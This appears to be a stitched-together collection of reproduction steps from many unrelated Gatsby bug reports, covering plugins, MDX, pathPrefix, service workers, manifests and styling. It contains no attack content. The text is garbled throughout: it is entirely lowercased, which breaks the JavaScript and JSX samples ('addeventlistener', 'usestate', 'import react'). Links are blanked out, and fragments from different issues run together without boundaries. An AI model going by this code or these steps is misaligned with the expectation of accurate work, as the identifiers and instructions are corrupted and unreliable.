if you need me to make a demo repo i guess i can, but the above clearly explains the issue.
in an existing project running gatsby@2.13.50
- remove package.lock.json
- npm install
- npx gatsby develop
download [this demo project]( and run `gatsby develop`
with the development site open in a web browser make a change to src/data/thing.yaml
use my config: ```js
module.exports = { sitemetadata: {}, plugins: [ { resolve: `gatsby-plugin-layout`, options: { component: require.resolve(`./src/layouts/default.tsx`), }, }, `gatsby-plugin-netlify`, { resolve: `gatsby-plugin-netlify-headers`, options: { headers: { "/storybook/*": [ "basic-auth: letmein:please", "x-frame-options: sameorigin", ], }, }, }, `gatsby-plugin-emotion`, `gatsby-plugin-typescript`, `gatsby-plugin-react-helmet`, `gatsby-plugin-sharp`, { resolve: `gatsby-plugin-create-client-paths`, options: { prefixes: [`/recipe/*`] }, }, { resolve: `gatsby-plugin-offline`, options: { workboxconfig: { cacheid: `my-app`, }, appendscript: require.resolve(`./src/sw-extension.js`), }, }, { resolve: `gatsby-plugin-gtag`, options: { trackingid: process.env.gatsby_google_analytics_id, head: true, anonymize: true, respectdnt: true, }, }, { resolve: "gatsby-plugin-react-svg", options: { rule: { include: /theme\\/icons/, }, }, }, { resolve: `gatsby-plugin-manifest`, options: {}, }, ],
// src/sw-extension.js
function getendpoint() { return self.registration.pushmanager.getsubscription().then((subscription) => { if (subscription) { return subscription.endpoint; } throw new error('user not subscribed'); });
} self.addeventlistener('push', (event) => { event.waituntil(getendpoint() .then((endpoint) => { return fetch(`myurl`, { headers: {} }); }) .then(response => response.json()) .then((data) => { let cont = { body: data.body, icon: data.icon, }; if ( typeof data.click_action !== 'undefined' && data.click_action && typeof data.click_title !== 'undefined' && data.click_title ) { cont.data = { url: data.click_action }; cont.actions = [{ action: 'open_url', title: data.click_title }]; } self.registration.shownotification(data.title, cont); }));
}); self.addeventlistener( 'notificationclick', (event) => { switch (event.action) { case 'open_url': clients.openwindow(event.notification.data.url); break; } // close notification after click and open the pwa if we've clicked the notification itself
event.notification.close(); if (clients.openwindow && event.notification.data.url) { event.waituntil(clients.openwindow(event.notification.data.url)); } }, false
create a new gatsby project
add an `assetprefix`
run `gatsby build --prefix-paths` and compare the icon links in `public/index.html` with the ones in `manifest.webmanifest`
those in `index.html` are prefixed, while the ones in the manifest are not
se this repo: and compare icon links in [public/index.html]( with [public/manifest.webmanifest](
```js { resolve: `gatsby-plugin-netlify`, options: { headers: { '/icons/*': [ 'cache-control: public, max-age=31536000, immutable', ], }, },
to help out understanding the bug, i created a repo
you can find there a gatsby starter, adding on top `gatsby-transformer-json` and a configuration for adding data files with `gatsby-source-filesystem`
- download the netlifycms branch of
- yarn install
- cd example
- gatsby build
**run `gatsby develop` for the first time (lock-file is not available yet).**
the lock-file gets generated and all the fields (including the `mdx.body` are populated within the queries)
everything looks fine, plus, the generated typing declared the body as a `non-nullable` value ( `string!`), which is also correct.
**re-run `gatsby develop` with the lock-file in place.**
it almost seems to be skipping the `source and transform nodes` step (compared to the first run where it takes minutes) and breaks in the end because of the `mdx.body` values, which are `null` now altogether
the `rawbody`, however, is still populated.
opening my personal site [janosh.io]( (which i recently ported from remark to mdx, maybe that's related since i didn't notice the following behavior before) and rapidly clicking links in the nav bar eventually results in a blank page
reloading the page displays the error message "this site can be reached"
![offline]( doing a hard refresh (cmd + shift + r in chrome) displays the page correctly
this seems to suggest that there's a problem with gatsby link
the chrome console only shows ```
typeerror: n is not a function at fe02a7e7eb3227117962882a7cf3d7cc3b71fffa.js:1 at t.unstable_runwithpriority (fe02a7e7eb3227117962882a7cf3d7cc3b71fffa.js:1) at di (fe02a7e7eb3227117962882a7cf3d7cc3b71fffa.js:1) at da (fe02a7e7eb3227117962882a7cf3d7cc3b71fffa.js:1) at va (fe02a7e7eb3227117962882a7cf3d7cc3b71fffa.js:1) at wu (fe02a7e7eb3227117962882a7cf3d7cc3b71fffa.js:1) at t.unstable_runwithpriority (fe02a7e7eb3227117962882a7cf3d7cc3b71fffa.js:1) at di (fe02a7e7eb3227117962882a7cf3d7cc3b71fffa.js:1) at qu (fe02a7e7eb3227117962882a7cf3d7cc3b71fffa.js:1) at iu (fe02a7e7eb3227117962882a7cf3d7cc3b71fffa.js:1)
``` which makes this hard to debug
`unstable_runwithpriority` sounds a little bit like it might be related to prefetching
any advice?
clone repository [mdx-slug]( and execute
npm install
gatsby build --prefix-paths
gatsby serve --prefix-paths
```md ```jsx{numberlines: true}
import { component } from 'react' class test extends component { constructor(props) { super(props) } componentdidmount() { // do something on mount here } // highlight-start render() { return ( <> <h1>test {this.props.test}</h1> <div dangerouslysetinnerhtml={{ __html: this.props.html }} /> </> ) } // highlight-end
} export default test
\\``` ``` ![bildschirmfoto 2019-09-30 um 17 02 47](
query a data source using `fixed` or `fluid` [and a supported webp fragment.]( #gatsby-transformer-sharp) do not use `toformat`.
using the gatsby-image package, try to render an image from the data, using the `fixed` or `fluid` props.
you can either clone this repo : or 1
gatsby new mdx-gatsby
cd mdx-gatsby
in `src/pages/index.mdx` add : ```jsx import { usestate } from "react"; <div> <h2>count </h2> {() => { const [count, setcount] = usestate(0); return <div onclick={() => setcount(count + 1)}>some message {count}</div>; }} </div>
`npm start`
create a new `gatsby-starter-hello-world` project
install `gatsby-plugin-offline`.
run `gatsby develop` and navigate to it in a browser window.
run `gatsby build` in a different terminal.
refresh browser window; side note: i am not sure if service workers can be installed on localhost
due to networking issues i use it through a valid domain name with https
my usage seems to be an edge case, but i report the bug because it is unexpected.
* use lokijs
* have a lot of nodes
* do whatever it is that causes nodes to become stale
go to the example click on any other page that is not the 1st page
then click refresh
you will see that the background color is not the correct color but is instead the background color for page 1 you can also go directly to and see that the background color is that of page 1 instead of purple like it should be
you can reproduce the issue at the specified commit in this project:
see for more info on which gatsby versions at which commit behaved normal and which commit introduced the bug
when checking out a specific commit, i ran `yarn run clean` (purge cache) and `yarn run purge` (purge dependencies) and then installed dependencies with `yarn` before testing.
run gatsby develop
i have created a vanilla project based on `gatsby new`
i started by adding the contenful source config, and that worked
i was able to query graphiql and all was good
i added the `gatsby-transformer-remark` plugin, and again, all good
however, the act of installing `gatsby-plugin-mdx` instantly caused the build to break
i have created a sample application for you here: i've just stuck a place for the contentful keys at the top of the `gatsby-config` file for now
if you create a vanilla project in contentful (i signed up as a new user and used the app they create as a sample), you should see this error occurring.
the link to the demo project with the reproducible issue is
it is based off [gatsby-starter-blog]( with 2 nearly identical markdown pages (except one has raw html in it)
clone project (`git clone `)
install npm packages and build project (`npm i && npm start`)
go to ` ` and click the image.
go to ` ` and click the image.
on the production page, visit the url: ` ` the plugins page puts all query parameters (except for the first character) directly into the search box, such that this link will open to a plugins page searching for `ello=world&ga=true`
the following `gatsby-plugin-less` config is used in `gatsby-config.js`: ```
{ resolve: `gatsby-plugin-less`, options: { javascriptenabled: true, cssloaderoptions: { modules: true, }, }
``` i have the latest version of `gatsby-plugin-less` and `less` as dependencies
in production, the `classname` is not substituted with the unique hash e.g
`classname="{stylesheet.test}"` would yield `class="test-45kjdf9"` that\'s substituted in development
i notice in a file like `public/styles-d07fbb57178d9cf7cc46.js`, the styling for the `test` class appears.
tested in firefox and chrome.
css files are from documentation site.
order did not matter
####gatsby-browser.js
```javascript
require("prismjs/themes/prism-tomorrow.css")
require("prismjs/plugins/command-line/prism-command-line.css")
require("prismjs/plugins/line-numbers/prism-line-numbers.css")
require("./src/css/prism/line-highlight.css")
require("./src/css/prism/line-numbers.css")
require("./src/css/prism/command-prompt.css")
``` #### mdx file
set code options to: `javascript {numberlines: true}{4,8,13}`
```javascript
import react from "react"
import layout from "../components/layout/layout"
import seo from "../components/seo" const notfoundpage = () => ( <layout> <seo title="404: not found" /> <h1>not found</h1> <p>you just hit a route that doesn\'t exist..
the sadness.</p> </layout>
) export default notfoundpage
``` mark empty line to highlight it or include empty line in highlight range.
- create a root directory for a new gatsby site (e.g
`e:\ epos\\grumpyv2`) and make sure the windows terminal shows the current path with a lower-case drive letter (clown around with something like `cd /d e:\ epos` from a different drive letter to make sure it really is lowercase)
- clone my sample repo from or just create a new gatsby site that has a graphql query in one of its pages, e.g
`gatsby new gatsby-starter-blog-mdx ` (which is all my sample repo is)
- `gatsby build`
configuration as above
create `mdx` file in a directory configured with `source-filesystem` plugin.
you can see this in [browersling]( the website is:
you can find the repo here:
i don't know how it started happening :/ sorry
repositories: 1 `npm run check` // update all packages to latest
2 `npm start` // start project
unfortunately, i can't grant access to the project's repository
i have the [very same project setup]( as gh repository that i'm sharing for reference
- developing and browsing the app locally using `gatsby develop` works perfectly fine.
- building using `gatsby build` passes just fine too
no warnings or errors.
- serving using `gatsby serve` serves the already built files
however, styles get messed up as described in this issue.
install and run the default `gatsby-starter-notes-theme` ```sh
gatsby new my-themed-notes
here's a repro: it's a fresh site with the default starter made by `gatsby new`
then i added both a page query and static query to `src/pages/index.js`
link to repo: git clone repo --> gatsby develop --> open localhost:8000 in google chrome
include `gatsby-remark-images` in a site and put an image in a blog post.
view the site in reeder or netnewswire
as this is kind of tricky to reproduce outside of our production environment i would like to run it past you before i go the effort and try to create a fake site somewhere in our stack
if you think this is a requirement, let me know but i hope this issue and the potential fix is in line with your existing code anyway, so maybe we can just add/fix this (as i said, please let me know if this isn\'t enough) <img width="718" alt="screenshot 2019-09-12 09 50 42" src=" ">
package.json
"dependencies": { ..
"gatsby-plugin-remote-images": "^1.0.7", ..
"gatsby-source-thirdparty": "^1.0.5", ..
``` gatsby-config.js
{ resolve: 'gatsby-source-thirdparty', options: { url: ' name: 'posts', payloadkey: 'posts', },
{ resolve: 'gatsby-plugin-remote-images', options: { nodetype: 'thirdparty__posts', imagepath: 'remote_image_url', },
`gatsby clean`
`gatsby develop`
-- stop develop server---
`gatsby develop`
* set `pathprefix` to `/p`, and create a directory in the page root directory called `/privacynotice`.
* gatsby incorrectly strips `/p` from the page location, resulting in `rivacynotice` being used.
* when hovering a `<link to="/privacynotice">...</link>` the browser will attempt to fetch the file `/p/page-data/rivacynotice/page-data.json` ### todos
- [x] identify best place to fix this - current best lead is the `trimpathname()` function in `find-path.js`
- [x] find and implement the fix
- [x] seek guidance on any potential flaws with this approach
- [x] update unit tests - `gatsby/packages/gatsby/cache-dir/__tests__/find-path.js`
- [x] e2e tests
[code sandbox]( 1
go to /admin
click "user 123"
- navigate to
- open your inspector
- click on the first blog article
- see all images from previous page being loaded in inspector
- create a page from a node in a graphql query in `gatsby-node.js` using the `createpages` api
- run `gatsby build`
- make sure the node that created that page will be fully deleted or not recreated in the next build
- run `gatsby build && gatsby serve`
- visit the deleted page to see it load in after the 404 page
build a site with gatsby-plugin-offline
disable js in the browser
reload the page
* add a link to the `header`, e.g.: `<link rel="preconnect" href=" " />,`
* unregister sw if previously registered;
* observe errors in console.
when i bump to gatsby-plugin-manifest 2.2.7 or higher this will give me this error
everything before seems to work
i just write this in any mdx processed file ```
* row level security scope * configuration provider * configuration build process * import configuration reposetory
visit page and highlight the same code block - also happens on the fixed code tag as well (above fluid).
demo repo:
netlify: 1
navigate to the netlify demo (or run `gatsby build && gatsby serve` on the test repo)
open devtools and confirm that the manifest in `<head>` is `manifest-en.webmanifest` as expected.
click on the "spanish" link to navigate to `/es/`.
see that the manifest is still `manifest-en.webmanifest` rather than `manifest-es.webmanifest`.
using the following packages: `gatsby @ ^2.11.0`
`gatsby-transformer-remark @ ^2.6.19`
`gatsby-remark-prismjs @ ^3.3.9`
here's my graphql that is failing after upgrading gatsby:
export const query = graphql` fragment hero on markdownremarkfrontmatter { hero { childimagesharp { fluid( quality: 80 maxwidth: 1920 duotone: {highlight: "#ffcc5c", shadow: "#ff6f69", opacity: 50} ) { ...gatsbyimagesharpfluid } } } }
- repo:
- netlify: (note that the bug is not reproducible here as it only affects development mode) note that this bug only appears in development mode (`gatsby develop`), not in production (`gatsby build && gatsby serve`) 1
clone the repo and run `gatsby develop`
click on "hello world" to view the test blog post
note that when the image is loaded, the blurred image behind it disappears with opacity set to 0 (as expected)
refresh the page
clone and run `yarn workspace emma develop` and see the individual project pages not working.
> the issue is happening in circleci for a private repo, any idea on what and how i could share more information about it?
- checkout any gatsby starterkit
- install plugins
"gatsby": "^2.13.67"
"gatsby-plugin-sass": "^2.1.8"
"gatsby-plugin-postcss": "^2.1.3"
- create `postcss.config.js` at root
console.log('###############'); module.exports = {};
- file is not loaded (no log statement visible)
create a new gatsby site using the gatsby-starter-blog (e.g gatsby new my-themed-blog
change `gatsby-config.js` to add option `markdowncaptions: true` on `gatsby-remark-images` block
run yarn develop
clone [30-seconds-of-code](
switch to `from-starter` branch.
run `npm i`.
run `npm run webber` or `gatsby build`.
see the output without any css
--- * additionally, you can check this [netlify build]( to see what the output is
* a project with the same structure can be found [here]( and its build, found [here]( produces the correct result.
run `gatsby develop`
after it has entered the server loop, hit ^c
terminal is no longer echoing prompts, etc
back to the console
running either `tset` or `reset` is required.
// gatsby-ssr.js
exports.onprerenderhtml = ({ getheadcomponents }) => { console.log(typeof getheadcomponents) // function
create a new gatsby site using the gatsby-theme-blog (e.g `gatsby new my-themed-blog `)
create a post with footnotes in it (or add a footnote to one of the sample pages)
run `yarn develop`
run `gatsby develop` and hit ctrl+c.
terminal stops showing text input.
create fresh gatsby site with default starter
add [`gatsby-plugin-use-dark-mode`]( #readme) with `npm`
build on node.js v10 (active lts) #### example project:
run `production-runtime.js` tests on ci
i have set `pathprefix` to `/p`, and i have a directory in the page root directory called `/privacynotice`.
gatsby will incorrectly strip `/p` from the page location, resulting in `rivacynotice` being used.
when hovering a `<link to="/privacynotice">...</link>` the browser will attempt to fetch the file `/p/page-data/rivacynotice/page-data.json`.
#### working example 1
clone
run with `yarn develop`
interact with <img width="214" alt="screen shot 2019-08-05 at 4 38 08 pm" src=" "> to open offcanvas and view articles
** note my addition in #l10 that transpiles chaoskit which has worked consistently until now
#### broken example 1
clone
run with `yarn develop`
interact with <img width="214" alt="screen shot 2019-08-05 at 4 38 08 pm" src=" "> to open offcanvas and view articles.
page crashes; not grabbing dependency timeline (gsap) correctly.
add option to plugin to use `resolveurlloader`:
{ resolve: `gatsby-plugin-sass`, options: { useresolveurlloader: true, },
assuming a `src` folder structure like this:
|--- assets |---css |---fonts
|--- components
create an `*.scss` file that uses a `url()` import
// src/assets/css/fonts.scss
@font-face { font-family: "monotype corsiva"; src: url("../fonts/mtcorsva.ttf") format("truetype");
`@import` the font css from assets/css, within a style module
// src/components/style.module.scss
@import "../assets/css/fonts";
gatsby new my-themed-blog
cd my-theme-blog
yarn add gatsby-theme-documentation
go here and click on any gatsby theme
1) spin up a linux instance (either a vm or container)
2) download node (tested on both 10 and 12 and breaks on both)
3) run `npx gatsby new .`
use official theme starter
` `
given an absolutely minimal gatsby app, i.e
[starter-hello-world]( and adding `gatsby-plugin-layout` and three files: layouts/index.js
import react, { usestate } from "react" const layout = ({ children }) => { const [time] = usestate(date.now()) console.log(time) return <div>{children}</div>
} export default layout
``` pages/index.js
import react from "react"
import { navigate } from "gatsby" export default () => <div onclick={() => navigate("/foo")}>hello world!</div>
``` pages/foo.js
import react from "react"
import { navigate } from "gatsby" export default () => <div onclick={() => navigate("/")}>hello foo!</div>
``` navigating between index and foo will reproduce the layout state issue, the console logs will demonstrate that the time can change
i'm on windows, so i don't know if the same steps will reproduce the issue on other os's
create a user whose name contains spaces
create a project anywhere
install openssl and add it to the path env variable
run the command `gatsby develop --https`
run `gatsby clean`
create a content entry
publish the entry
run `gatsby build`
unpublish the content entry
run `gatsby build`
starting from the default gatsby starter, create a `src/pages/app.js` and `src/pages/txt.js`, and create have a gatsby-node.js like this:
exports.oncreatepage = ({ page, actions }) => { const { createpage } = actions if (page.path.match(/^\\/app/)) { createpage({ ...page, matchpath: "/app/*", }) } if (page.path.match(/^\\/txt/)) { createpage({ ...page, matchpath: "/txt/*", }) } if (page.path === "/") { createpage({ ...page, matchpath: "/*", }) }
run `gatsby build` 3
check `.cache/match-paths.json`
it should look like this: ```json
[ { "path": "/app/", "matchpath": "/app/*" }, { "path": "/", "matchpath": "/*" }, { "path": "/txt/", "matchpath": "/txt/*" }
``` note: changing the `/txt/` page's matchpath to `/app/*` doesn't change the ordering
it looks like matchpath isn't taken into account or is superseded by some other sorting.
[ { "path": "/app/", "matchpath": "/app/*" }, { "path": "/", "matchpath": "/*" }, { "path": "/txt/", "matchpath": "/app/*" }
clone `master` branch of
execute `yarn build` for first time.
`yarn build` again
install firefox developer edition
run gatsby develop on any gatsby project (no offline plugin nor anything sw-related)
- go to #read-more-about-mdx
- click on the first bullet point (`why mdx?`)
- view `page not found`
clone and build (i have removed most posts to make the build faster) 2
`gatsby serve`
navigate to ` `
set chrome to mobile view 5
refresh page to see content disappear
go to the hamburger menu > sections > blog then click on the markov decision post again 7
see the correct styles applied.
following instructions in:
add line numbering option
in a markdown file, add following code:
```jsx{5-8}{numberlines: true}
// during first render
function counter() { // ..
useeffect( // effect function from first render () => { document.title = `you clicked ${0} times` } ) // ...
i am not sure how it can be reproduced
it started happening after i added `gatsby-source-filesystem` and began calling `createpage` from within `oncreatenode` for nodes created from files
sorry if this is vague, but i am really not sure what is causing this.
add `oncreatepage` handler that modifies page path
[here's a simple example that i used to reproduce the issue]( #removing-trailing-slashes) 2
run `develop` command 3
add a sample page to the `src/pages` 4
delete the page
follow the guide as far as `yarn test`.
see this repo:
`$ gatsby new` choose a project name of your liking.
choose the "gatsby-starter-hello-world"
create a custom 404 page at `src/pages/404.js`:
import react from "react" export default () => <div>404</div>
``` `$ rm .cache public -rf && npm run build && npm run serve` navigate to you should see a page containing "hello world" navigate to you should see a page containing "404" configure a pathprefix: `package.json`:
"scripts": { ..
"build": "gatsby build --prefix-paths", ..
"serve": "gatsby serve --prefix-paths", ..
``` `gatsby-config.js`:
module.exports = { pathprefix: '/foo',
``` `$ rm .cache public -rf && npm run build && npm run serve` navigate to you should see a page containing "hello world" navigate to you should see a page containing "404" but you will get an empty page.
here was my package.json before the update/upgrade: ```
{ "name": "gatsby-starter-default", "private": true, "description": "a simple starter to get up and developing quickly with gatsby", "version": "0.1.0", "author": "kyle mathews <mathews.kyle@gmail.com>", "dependencies": { "algoliasearch": "^3.33.0", "babel-plugin-styled-components": "^1.10.2", "dotenv": "^8.0.0", "gatsby": "^2.10.5", "gatsby-image": "^2.2.3", "gatsby-plugin-algolia": "^0.3.0", "gatsby-plugin-manifest": "^2.2.0", "gatsby-plugin-offline": "^2.2.0", "gatsby-plugin-sass": "^2.1.0", "gatsby-plugin-sharp": "^2.2.1", "gatsby-plugin-styled-components": "^3.1.0", "gatsby-remark-autolink-headers": "^2.1.0", "gatsby-remark-code-buttons": "^2.0.1", "gatsby-remark-images": "^3.1.2", "gatsby-remark-prismjs": "^3.3.0", "gatsby-source-filesystem": "^2.1.1", "gatsby-transformer-remark": "^2.5.0", "gatsby-transformer-sharp": "^2.2.0", "node-sass": "^4.12.0", "prismjs": "^1.16.0", "prop-types": "^15.7.2", "react": "^16.8.6", "react-dom": "^16.8.6", "react-instantsearch-dom": "^5.7.0", "sanitize.css": "^10.0.0", "styled-components": "^4.3.2" }, "devdependencies": { "gh-pages": "^2.0.1", "prettier": "^1.18.2" }, "keywords": [ "gatsby" ], "license": "mit", "scripts": { "build": "gatsby build", "develop": "gatsby develop", "format": "prettier --write src/**/*.{js,jsx}", "start": "npm run develop", "serve": "gatsby serve", "deploy": "gatsby build --prefix-paths && gh-pages -d public" }, "repository": { "type": "git", "url": " " }, "bugs": { "url": " " }
``` and here it is after: ```
{ "name": "gatsby-starter-default", "private": true, "description": "a simple starter to get up and developing quickly with gatsby", "version": "0.1.0", "author": "kyle mathews <mathews.kyle@gmail.com>", "dependencies": { "algoliasearch": "^3.33.0", "babel-plugin-styled-components": "^1.10.2", "dotenv": "^8.0.0", "gatsby": "^2.10.5", "gatsby-image": "^2.2.3", "gatsby-plugin-algolia": "^0.3.0", "gatsby-plugin-manifest": "^2.2.0", "gatsby-plugin-offline": "^2.2.0", "gatsby-plugin-sass": "^2.1.0", "gatsby-plugin-sharp": "^2.2.1", "gatsby-plugin-styled-components": "^3.1.0", "gatsby-remark-autolink-headers": "^2.1.0", "gatsby-remark-code-buttons": "^2.0.1", "gatsby-remark-images": "^3.1.2", "gatsby-remark-prismjs": "^3.3.0", "gatsby-source-filesystem": "^2.1.1", "gatsby-transformer-remark": "^2.5.0", "gatsby-transformer-sharp": "^2.2.0", "node-sass": "^4.12.0", "prismjs": "^1.16.0", "prop-types": "^15.7.2", "react": "^16.8.6", "react-dom": "^16.8.6", "react-instantsearch-dom": "^5.7.0", "sanitize.css": "^10.0.0", "styled-components": "^4.3.2" }, "devdependencies": { "gh-pages": "^2.0.1", "prettier": "^1.18.2" }, "keywords": [ "gatsby" ], "license": "mit", "scripts": { "build": "gatsby build", "develop": "gatsby develop", "format": "prettier --write src/**/*.{js,jsx}", "start": "npm run develop", "serve": "gatsby serve", "deploy": "gatsby build --prefix-paths && gh-pages -d public" }, "repository": { "type": "git", "url": " " }, "bugs": { "url": " " }
``` the following diff image shows what was upgraded which invariably broke the prefix paths on images: <img width="943" alt="screen shot 2019-07-16 at 11 28 58 am" src=" ">
this doesn't really have a reproducible step, as it's just code that isn't being used due to a bad path with no caught error logged.
- `gatsby new my-blog gatsbyjs/gatsby-starter-blog-theme`
- `cd my-blog`
- `gatsby develop`
- browse to ` `
- check the terminal to see this message: ```
error loading a result for the page query in "/404.html"
query was not run and no cached result was
page not found /404.html
``` - this message will be printed to the terminal every time the page is refreshed
there's also a repro available at courtesy of @polishedwp
start a new site using `gatsby new`
start the development server and navigate to a working page such as the root in the browser
add a folder under pages with a javascript with an error in it (for instance, `import blah from 'blah'` - an import of a non-existent package)
the error appears in the browser and the command line
remove the folder again
refresh the page in the browser a bunch of times - the error appears intermittently until `gatsby develop` has been restarted #### video ![kapture 2019-07-15 at 12 09 49](
capture some chinese sites screenshot by using `gatsby-transformer-screenshot`
create an image field by: ```js
createnodefield({ node, name: 'cover', value: node.frontmatter.cover })
``` in fact, `frontmatter.cover` and `fields.cover` are just aliases.
this is the repository and the specific line in question: #l327 run `gatsby develop` and on the page, each blog post block will have subtle lines
run `gatsby build`, `gatsby serve` and navigate to
the lines will no longer appear.
in windows machine, run: ```bash
gatsby new my-blog
``` then ```bash
``` then you should be able to see the links on the home page is incorrect.
create a new `gatsby-theme-blog` site and start it:
gatsby new my-themed-blog
cd my-themed-blog
gatsby develop
``` then go to since that post conveniently has a few codeblocks that demonstrate both of these issues.
with dependencies: "dependencies": { "gatsby": "^2.13.4" }, run `gatsby develop` in a command prompt on command prompt or powershell
create a new site from the gatsby blog theme starter
pull a local copy of `gatsby-theme-blog`
set it up as a workspace
on starting `develop` mode, it\'ll crash with "unexpected token" errors.
doing this with a theme that shadows gatsby-plugin-theme-ui's index.js file
i created a test site for trying out gatsby themes with the following command:
`gatsby new my-blog ` then started:
`gatsby develop` _***i did not create a demo project for testing since it was a baseline site
i can if need be.***_
setup a monorepo with a theme and example site, add some pages to the theme (basically following jason's course)
run `yarn workspace my-theme develop` and try to visit `localhost:8000/asdf`.
i made an example project i created this example from gatsby-starter-hello-world and i simply followed the instructions for gatsby-plugin-typescript
see my changes here
use starter project that is using the 'gatsby-plugin-create-client-paths' plugin and the latest version of gatsby
to check that version 2.13.2 is the problem, fix gatsby version to 2.13.1 and check that it is now working as expected.
i've tried to replicate the issue with the client-only-routes example
alas i could not reproduce the error.
go to
* use pnpm to install gatsby and gatsby-plugin-offline
* include gatsby-plugin-offline as a plugin
markdownremark is returning entire article for excerpt field
was previously running `"gatsby-transformer-remark": "2.3.12",` with it working fine, but upgrading to `"gatsby-transformer-remark": "2.5.0",` has the issue.
fork this sandbox where i replaced `404.js` page content with content from `components/image.js`.
run `yarn build`
here's my file structure and image tag in markdown
![image](
import react from "react";
import { graphql, staticquery } from "gatsby";
import img from "gatsby-image"; export default function myimage() { return ( <staticquery query={graphql` query { logoimage: file(relativepath: { eq: "paddle.png" }) { childimagesharp { fluid(maxheight: 35) { ...gatsbyimagesharpfluid } } } } `} render={data => <img fluid={data.logoimage.childimagesharp.fluid} />} /> );
i have setup a repo to illustrate this issue:
[
](
the sample application is found at [
](
) step 1: navigate to the sample app
step 2: click on "issue page"
step 3: refresh page
in the wordpress backend add a acf group to a post or page.
then put the acf flexible content field below
fill in demo content on the page or post
try the query as described in the documentation of gatsby-source-wordpress ( #query-with-acf-flexible-content)
pull a `author/rayriffy` branch of [rayriffy/rayriffy-blog]( and then start development server by using `yarn dev`
browse your menu in graphiql when you have a menu on drupal with nested menu items <img width="1440" alt="screenshot 2019-06-21 at 17 10 28" src=" ">
you can start with this repo here: basically you - generate a new gatsby app
- configure gatsby to treat all routes (`/*`) as being client-side
- view the production version of the app
create and trust ssl certificates, then run gatsby using them
i've also tried with the auto generated certificates and i get a different error
gatsby develop --port 8002 --https --key-file ../config/localhost/key.pem --cert-file ../config/localhost/cert.pem
npm i --save gatsby-image@latest
import image from gatsby graphql w/ webp 3
place below the fold and turn off chrome cache, and scroll down to image:
<image loading="eager" />
<image criticial />
cd /home/myusername
npm install -g gatsby
gatsby new gatsby-site
cd gatsby-site
npm run build
---pages/index.js
```javascript
export const exportedfragment = graphql` fragment exportedfragment on type { id created(formatstring: "mmmm dd yyyy") path { alias } field_components { ..
on text { information } ..
on image { informaiton } } } }
``` --- pages/anotherpage
``` const data = usestaticquery(graphql` { alltype { nodes { ...exportedfragment } } } `);
no error --- components/componentwhofails/componentwhofails.js
``` const data = usestaticquery(graphql` { alltype { nodes { ...exportedfragment } } } `);
throws an error in the build process
the build process does however complete.
clone this minimal repo: run `npm start`
`git clone `
`yarn install`
`yarn build`
`npx http-server ./public` (or any other simple http server that serves `./public`) you should see a fouc
going back to the previous commit should **not** have it (`git checkout 5022cb6`).
`mkdir parent && cd parent && npm init`
`npm install --save-dev react react-dom`
`npx gatsby new site`
this will install `react` in `./site/node_modules` (which it should not).
imperatively navigate to another page
the `location.state` prop will be `undefined` in the destination page component
**reproduction:**
- clone the starter
- update `gatsby-plugin-netlify-cms` to 4.0.2
- `yarn start`
try using gatsby's `link` component in a storybook instance.
include both gatsby-plugin-google-tagmanager and gatsby-plugin-svg-sprite in your project (package.json and gatsby-config.js) and include a svg somewhere on the page
in gatsby-config.js:
![image]( when the html is outputted, the `svg` tag is inserted before the `noscript` from gtm under the `body` tag
![image]( as a result, the google search console verification does not work.
build a theme with an export of any components.
shadow a component in that theme and `import x from 'your-theme'` and use x.
`yarn build`
`yarn serve`
visit the page
use gatsby-remark-images on the markdown file that use dashes in the name of key in the frontmatter.
create a new project using gatsby, run gatsby-develop, delete a file from your project.
change highlight and shadow colours and rebuild
- `yarn develop`
create any markdown file with multiple paragraphs
for example: ```markdown
paragraph one sentence one
sentence two
paragraph two sentence one
paragraph three sentence one.
``` query all remark excerpts in graphiql: ```graphql
query { allmarkdownremark { edges { node { excerpt } } }
``` witness the excerpt is generated without spaces between paragraphs: ```
paragraph one sentence one
sentence two.paragraph two sentence one.paragraph three sentence one.
``` ### demo project
gatsby new gatsby-site
cd gatsby-site
``` edit `index.js` and `page-2.js` to get as minimal as posible:
// index.js
import react from "react"
import { link } from "gatsby"
const indexpage = () => (<link to="/page-2/">go to page 2</link>)
export default indexpage
// page-2.js
import react from "react"
import { link } from "gatsby"
const secondpage = () => (<link to="/">go back to the homepage</link>)
export default secondpage
``` ```bash
gatsby build
gatsby serve
``` open `localhost:9000` on chrome, and open the performance monitor.
every time you click on the links, dom nodes increase (but never gets garbage collected)
{ resolve: "gatsby-remark-images", options: { maxwidth: 1200, withwebp: true, quality: 85, tracedsvg: false, showcaptions: true }
``` ![](
use html character in image caption
open a gatsby project and run
`npm install --no-optional`
`npm run build build`
i made a minimal reproduction case in this repo: ```sh
git clone
npm install
``` the types were generated using apollo cli
if you wish to re-run the code generation: ```sh
npm run clean-generate
``` note that i have tried inlining the types inside the component, but the warning is still there.
insert the following code into index.js of a new gatsby project
import react from "react"
import styled from "@emotion/styled" const titlestyle = styled.h1`color: #bad101;`
const title = ({ children }) => <titlestyle>{children}</titlestyle> export default () => ( <div> <title>hello world</title> <title>bonjour world</title> <title>ciao world</title> </div>
build the project using `gatsby build`
inspect the generated source code
install fresh gatsby site
load in some svg images or icons
run "gatsby develop" or deploy and build on netlify
launch site.
reproduced by resizing the window
![gatsbyicons](
create a new gatsby project
add the shopify source with api key (our store has 4300 products inclusive of unique variants)
run `yarn start`
clone this repo
`yarn && yarn build` ```
warn code block or inline code language not specified in markdown
applying generic code block
warn unable to find prism language 'jsx:jsx:title=src/pages/index.js' for highlighting
applying generic code block
warn unable to find prism language 'es6' for highlighting
applying generic code block
warn unable to find prism language 'title:gatsby-node.js' for highlighting
applying generic code block
warn unable to find prism language 'javascript=gatsby-config.js' for highlighting
applying generic code block
warn unable to find prism language 'mdx' for highlighting
applying generic code block
warn unable to find prism language 'sh' for highlighting
applying generic code block
warn unable to find prism language 'js:gatsby-node.js' for highlighting
applying generic code block
warn unable to find prism language 'js:src/templates/post-list.js' for highlighting
applying generic code block
warn unable to find prism language 'js:src/components/layout.js' for highlighting
applying generic code block
warn unable to find prism language 'javascript=gatsby-node.js' for highlighting
applying generic code block
warn unable to find prism language 'title=.env.example' for highlighting
applying generic code block
warn unable to find prism language 'title=.env' for highlighting
applying generic code block
warn unable to find prism language 'javascript=' for highlighting
applying generic code block
warn unable to find prism language '[' for highlighting
applying generic code block
warn unable to find prism language 'terminal' for highlighting
applying generic code block
warn unable to find prism language 'title=public/' for highlighting
applying generic code block
warn unable to find prism language 'title=gatsby-config.js' for highlighting
applying generic code block
warn unable to find prism language 'console' for highlighting
applying generic code block
warn unable to find prism language 'env' for highlighting
applying generic code block
warn unable to find prism language 'hjson' for highlighting
applying generic code block
